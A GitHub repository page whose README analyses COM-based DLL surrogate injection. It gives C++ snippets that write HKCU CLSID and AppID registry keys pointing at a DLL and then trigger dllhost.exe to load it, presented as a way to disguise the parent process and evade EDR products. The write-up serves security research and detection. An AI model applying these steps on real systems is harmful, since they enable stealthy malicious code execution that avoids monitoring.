# https://github.com/zero2504/COMouflage

[Skip to content](https://github.com/zero2504/COMouflage#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/zero2504/COMouflage) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/zero2504/COMouflage) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/zero2504/COMouflage) to refresh your session.Dismiss alert

{{ message }}

[zero2504](https://github.com/zero2504)/ **[COMouflage](https://github.com/zero2504/COMouflage)** Public

- [Notifications](https://github.com/login?return_to=%2Fzero2504%2FCOMouflage) You must be signed in to change notification settings
- [Fork\\
16](https://github.com/login?return_to=%2Fzero2504%2FCOMouflage)
- [Star\\
143](https://github.com/login?return_to=%2Fzero2504%2FCOMouflage)


COM-based DLL Surrogate Injection


### License

[MIT license](https://github.com/zero2504/COMouflage/blob/main/LICENSE)

[143\\
stars](https://github.com/zero2504/COMouflage/stargazers) [16\\
forks](https://github.com/zero2504/COMouflage/forks) [Branches](https://github.com/zero2504/COMouflage/branches) [Tags](https://github.com/zero2504/COMouflage/tags) [Activity](https://github.com/zero2504/COMouflage/activity)

[Star](https://github.com/login?return_to=%2Fzero2504%2FCOMouflage)

[Notifications](https://github.com/login?return_to=%2Fzero2504%2FCOMouflage) You must be signed in to change notification settings

# zero2504/COMouflage

main

[**1** Branch](https://github.com/zero2504/COMouflage/branches) [**0** Tags](https://github.com/zero2504/COMouflage/tags)

[Go to Branches page](https://github.com/zero2504/COMouflage/branches)[Go to Tags page](https://github.com/zero2504/COMouflage/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![zero2504](https://avatars.githubusercontent.com/u/84348823?v=4&size=40)](https://github.com/zero2504)[zero2504](https://github.com/zero2504/COMouflage/commits?author=zero2504)<br>[Update README.md](https://github.com/zero2504/COMouflage/commit/5e45c5c8bb91316dca77e58c10bc8bb21ca27c29)<br>2 months agoDec 9, 2025<br>[5e45c5c](https://github.com/zero2504/COMouflage/commit/5e45c5c8bb91316dca77e58c10bc8bb21ca27c29) · 2 months agoDec 9, 2025<br>## History<br>[6 Commits](https://github.com/zero2504/COMouflage/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/zero2504/COMouflage/commits/main/) 6 Commits |
| [LICENSE](https://github.com/zero2504/COMouflage/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/zero2504/COMouflage/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/zero2504/COMouflage/commit/1270874330b1e4912507f013abfd448a349ecc1b "Initial commit") | 5 months agoSep 6, 2025 |
| [README.md](https://github.com/zero2504/COMouflage/blob/main/README.md "README.md") | [README.md](https://github.com/zero2504/COMouflage/blob/main/README.md "README.md") | [Update README.md](https://github.com/zero2504/COMouflage/commit/5e45c5c8bb91316dca77e58c10bc8bb21ca27c29 "Update README.md") | 2 months agoDec 9, 2025 |
| [main.cpp](https://github.com/zero2504/COMouflage/blob/main/main.cpp "main.cpp") | [main.cpp](https://github.com/zero2504/COMouflage/blob/main/main.cpp "main.cpp") | [Create main.cpp](https://github.com/zero2504/COMouflage/commit/e2c7814910fc3fd3bb623e47c461059a74b918ae "Create main.cpp") | 5 months agoSep 6, 2025 |
| View all files |

## Repository files navigation

# COMouflage

[Permalink: COMouflage](https://github.com/zero2504/COMouflage#comouflage)

# COM-based DLL Surrogate Injection

[Permalink: COM-based DLL Surrogate Injection](https://github.com/zero2504/COMouflage#com-based-dll-surrogate-injection)

## Abstract

[Permalink: Abstract](https://github.com/zero2504/COMouflage#abstract)

This paper analyzes a sophisticated injection technique that leverages the Component Object Model (COM) and DLL Surrogate processes for stealthy code execution. Unlike traditional COM hijacking methods focused primarily on persistence, this technique exploits the surrogate hosting capabilities to achieve process injection with several operational advantages, including parent process masquerading and reduced detection footprint.

## 1\. Introduction

[Permalink: 1. Introduction](https://github.com/zero2504/COMouflage#1-introduction)

Component Object Model (COM) hijacking has been extensively documented as a persistence mechanism in the MITRE ATT&CK framework. This paper examines the technical mechanics of COM-based DLL Surrogate injection.

## 2\. Technical Background

[Permalink: 2. Technical Background](https://github.com/zero2504/COMouflage#2-technical-background)

### 2.1 What is COM?

[Permalink: 2.1 What is COM?](https://github.com/zero2504/COMouflage#21-what-is-com)

The Component Object Model (COM) is a Microsoft technology that enables software components to communicate regardless of the programming language used to create them. COM objects are identified by globally unique identifiers (GUIDs) called Class Identifiers (CLSIDs) and can be instantiated through various mechanisms including:

- **In-process servers** (DLLs loaded into the calling process)
- **Out-of-process servers** (Separate executable processes)
- **Surrogate processes** (System-provided hosts for DLL-based COM objects)

### 2.2 Understanding dllhost.exe and DLL Surrogates

[Permalink: 2.2 Understanding dllhost.exe and DLL Surrogates](https://github.com/zero2504/COMouflage#22-understanding-dllhostexe-and-dll-surrogates)

`dllhost.exe` is a legitimate Windows system process that serves as a surrogate host for COM objects implemented as DLLs. This mechanism, known as “DLL Surrogate,” allows DLL-based COM objects to run in a separate process space, providing:

- **Process isolation**: Protects the calling application from DLL crashes
- **Security boundaries**: Enables different security contexts
- **Stability**: Prevents unstable DLLs from affecting the parent process

The surrogate is configured through registry entries, specifically the `DllSurrogate` value under the AppID registry key.

## 3\. Attack Technique Analysis

[Permalink: 3. Attack Technique Analysis](https://github.com/zero2504/COMouflage#3-attack-technique-analysis)

### 3.1 Registry Manipulation for HKCU Hijacking

[Permalink: 3.1 Registry Manipulation for HKCU Hijacking](https://github.com/zero2504/COMouflage#31-registry-manipulation-for-hkcu-hijacking)

The technique operates by creating specific registry entries in `HKEY_CURRENT_USER` rather than `HKEY_LOCAL_MACHINE`, which provides several advantages:

1. **Reduced privileges required**: No administrator rights needed
2. **User-specific targeting**: Affects only the current user context
3. **Stealth**: Less likely to be monitored compared to HKLM modifications

#### Registry Structure Created:

[Permalink: Registry Structure Created:](https://github.com/zero2504/COMouflage#registry-structure-created)

```
HKCU\Software\Classes\AppID\{CLSID}
├── (Default) = "MyStealthObject"
└── DllSurrogate = ""

HKCU\Software\Classes\CLSID\{CLSID}
├── (Default) = "MyStealthObject"
├── AppID = "{CLSID}"
└── InprocServer32\
    ├── (Default) = "C:\Path\To\Malicious.dll"
    └── ThreadingModel = "Apartment"
```

### 3.2 Process Tree Masquerading

[Permalink: 3.2 Process Tree Masquerading](https://github.com/zero2504/COMouflage#32-process-tree-masquerading)

When the malicious COM object is instantiated with `CLSCTX_LOCAL_SERVER`, Windows automatically launches `dllhost.exe` as a surrogate process. This creates a deceptive process tree:

```
svchost.exe (COM+ System Application)
└── dllhost.exe /Processid:{CLSID}
    └── [Malicious DLL loaded in-process]
```

**Key Advantages:**

- The parent process appears as `svchost.exe`, a highly trusted system process
- The initiating malicious process is not the direct parent of the injection target
- Standard parent-child process monitoring may miss the true attack chain

## 4\. Detailed Code Analysis

[Permalink: 4. Detailed Code Analysis](https://github.com/zero2504/COMouflage#4-detailed-code-analysis)

### 4.1 CLSID Definition and Constants

[Permalink: 4.1 CLSID Definition and Constants](https://github.com/zero2504/COMouflage#41-clsid-definition-and-constants)

```
static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";
```

The technique begins with a custom CLSID (Class Identifier), a 128-bit GUID that uniquely identifies the COM object. This particular CLSID is crafted to appear distinctive while avoiding conflicts with legitimate system components. The format follows the standard GUID structure: `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`.

### 4.2 Registry Manipulation Function

[Permalink: 4.2 Registry Manipulation Function](https://github.com/zero2504/COMouflage#42-registry-manipulation-function)

```
bool SetRegStr(HKEY root, const std::wstring& key,
               const std::wstring& name, const std::wstring& val) {
    HKEY h;
    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;

    if (RegSetValueExW(h,
        name.empty() ? nullptr : name.c_str(),
        0, REG_SZ,
        (const BYTE*)val.c_str(),
        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS)
    {
        RegCloseKey(h);
        return false;
    }
    RegCloseKey(h);
    return true;
}
```

**Technical Breakdown:**

1. **`RegCreateKeyExW`**: Creates or opens the specified registry key with `KEY_WRITE` permissions
2. **Error Handling**: Each registry operation includes proper error checking
3. **`REG_OPTION_NON_VOLATILE`**: Ensures the key persists across reboots -> Could be changed with **`REG_OPTION_VOLATILE`** (Stored in memory and is not preserved when the corresponding registry hive is unloaded)

### 4.3 AppID Registry Configuration

[Permalink: 4.3 AppID Registry Configuration](https://github.com/zero2504/COMouflage#43-appid-registry-configuration)

```
std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);
if (!SetRegStr(HKEY_CURRENT_USER, appidKey, L"", L"MyStealthObject") ||
    !SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L""))
```

**Critical Analysis:**

- **AppID Key Structure**: `HKCU\Software\Classes\AppID\{CLSID}`
- **Default Value**: “MyStealthObject” serves as a descriptive name
- **`DllSurrogate` = “”**: Empty string is crucial - signals Windows to use the default `dllhost.exe` as surrogate
- **HKCU vs HKLM**: User hive requires no elevation, reduces detection surface

### 4.4 CLSID Registry Configuration

[Permalink: 4.4 CLSID Registry Configuration](https://github.com/zero2504/COMouflage#44-clsid-registry-configuration)

```
std::wstring clsidKey = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";

if (!SetRegStr(HKEY_CURRENT_USER, clsidKey, L"", L"MyStealthObject") ||
    !SetRegStr(HKEY_CURRENT_USER, clsidKey, L"AppID", CLSID_STR) ||
    !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"", L"C:\\Users\\sample.dll") ||
    !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment"))
```

**Registry Structure Explanation:**

1. **CLSID Root**: `HKCU\Software\Classes\CLSID\{CLSID}`

- Links the object to its AppID
- Establishes object identity

1. **InprocServer32 Subkey**: Critical for DLL specification

- **Default Value**: Points to malicious DLL path
- **ThreadingModel**: “Apartment” ensures proper COM threading behavior
- **Path Selection**: Targets user-writable locations to avoid privilege escalation

### 4.5 COM Initialization and Object Creation

[Permalink: 4.5 COM Initialization and Object Creation](https://github.com/zero2504/COMouflage#45-com-initialization-and-object-creation)

```
HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
if (FAILED(hr)) {
    std::wcerr << L"[!] CoInitializeEx: 0x" << std::hex << hr << L"\n";
    return 1;
}

CLSID clsid;
hr = CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
if (FAILED(hr)) {
    std::wcerr << L"[!] Invalid CLSID\n";
    return 1;
}
```

**Technical Details:**

- **`CoInitializeEx`**: Initializes COM library for current thread
- **`COINIT_APARTMENTTHREADED`**: Single-threaded apartment model
- **`CLSIDFromString`**: Converts string representation to binary CLSID structure
- **Error Handling**: HRESULT checking follows COM best practices

### 4.6 Critical Injection Trigger

[Permalink: 4.6 Critical Injection Trigger](https://github.com/zero2504/COMouflage#46-critical-injection-trigger)

```
IUnknown* p;
hr = CoCreateInstance(clsid, nullptr,
    CLSCTX_LOCAL_SERVER,    // Key parameter!
    IID_IUnknown,
    (void**)&p);
```

**The `CLSCTX_LOCAL_SERVER` Significance:**

- **Process Boundary**: Forces out-of-process instantiation
- **Surrogate Trigger**: Windows automatically launches `dllhost.exe`
- **Parent Process Masquerading**: Creates `svchost.exe` → `dllhost.exe` chain

### 4.7 Process Flow Analysis

[Permalink: 4.7 Process Flow Analysis](https://github.com/zero2504/COMouflage#47-process-flow-analysis)

**Execution Sequence:**

1. Registry entries created in HKCU
2. COM system initialized
3. `CoCreateInstance` called with `CLSCTX_LOCAL_SERVER`
4. Windows COM Service Control Manager (SCM) processes the request
5. SCM detects `DllSurrogate` value and launches `dllhost.exe`
6. `dllhost.exe` loads the specified DLL from `InprocServer32`
7. Malicious code executes within the surrogate process context

**Result:** The malicious DLL runs in `dllhost.exe` with `svchost.exe` as apparent parent, obscuring the true attack vector.

## 5\. COMouflage versus EDR's

[Permalink: 5. COMouflage versus EDR's](https://github.com/zero2504/COMouflage#5-comouflage-versus-edrs)

In this evaluation, four leading Endpoint Detection and Response (EDR) solutions were examined without disclosing vendor identities. The goal was to assess how these solutions react to COMouflage-based surrogate execution.
During testing, one solution registered dllhost.exe activity but failed to classify it as suspicious, resulting in no alert being raised. Other solutions similarly did not detect the surrogate execution technique, allowing the process to run without generating any form of warning or intervention.
These observations highlight significant detection blind spots across multiple industry-standard platforms and underscore the need for improved behavioral analysis capabilities within modern EDR technologies.

## 6\. Conclusion

[Permalink: 6. Conclusion](https://github.com/zero2504/COMouflage#6-conclusion)

COM-based DLL Surrogate injection represents an evolution of traditional COM hijacking techniques, offering adversaries enhanced stealth capabilities through process tree masquerading. The technique’s reliance on legitimate Windows functionality makes detection challenging but not impossible with proper monitoring and forensic awareness.
This technique highlights the importance of understanding legitimate Windows mechanisms that can be subverted for malicious purposes.

## 7\. References

[Permalink: 7. References](https://github.com/zero2504/COMouflage#7-references)

\[1\] [https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal)

\[2\] [https://learn.microsoft.com/de-de/windows/win32/com/dllsurrogate](https://learn.microsoft.com/de-de/windows/win32/com/dllsurrogate)

\[3\] [https://attack.mitre.org/techniques/T1546/015/](https://attack.mitre.org/techniques/T1546/015/)

\[4\] [https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)

\[5\] [https://learn.microsoft.com/en-us/windows/win32/cossdk/com--threading-models](https://learn.microsoft.com/en-us/windows/win32/cossdk/com--threading-models)

## About

COM-based DLL Surrogate Injection


### Topics

[windows](https://github.com/topics/windows "Topic: windows") [com](https://github.com/topics/com "Topic: com") [malware](https://github.com/topics/malware "Topic: malware") [dll-injection](https://github.com/topics/dll-injection "Topic: dll-injection") [dll-sideloading](https://github.com/topics/dll-sideloading "Topic: dll-sideloading")

### Resources

[Readme](https://github.com/zero2504/COMouflage#readme-ov-file)

### License

[MIT license](https://github.com/zero2504/COMouflage#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/zero2504/COMouflage).

[Activity](https://github.com/zero2504/COMouflage/activity)

### Stars

[**143**\\
stars](https://github.com/zero2504/COMouflage/stargazers)

### Watchers

[**1**\\
watching](https://github.com/zero2504/COMouflage/watchers)

### Forks

[**16**\\
forks](https://github.com/zero2504/COMouflage/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fzero2504%2FCOMouflage&report=zero2504+%28user%29)

## [Releases](https://github.com/zero2504/COMouflage/releases)

No releases published

## [Packages\  0](https://github.com/users/zero2504/packages?repo_name=COMouflage)

No packages published

## Languages

- [C++100.0%](https://github.com/zero2504/COMouflage/search?l=c%2B%2B)

You can’t perform that action at this time.